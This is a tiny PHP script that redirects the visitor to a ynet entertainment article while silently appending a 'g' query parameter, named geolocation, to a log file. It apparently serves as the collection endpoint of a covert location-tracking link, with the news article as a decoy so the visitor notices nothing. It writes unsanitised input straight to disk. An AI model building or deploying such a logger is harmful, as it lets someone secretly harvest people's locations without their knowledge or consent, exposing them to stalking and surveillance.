<?php
header ('Location:https://www.ynet.co.il/entertainment/article/s1owkck2t');
$geolocation = $_GET["g"];
$file = fopen('log.txt', 'a');
fwrite($file, $geolocation . "\n\n");
?>
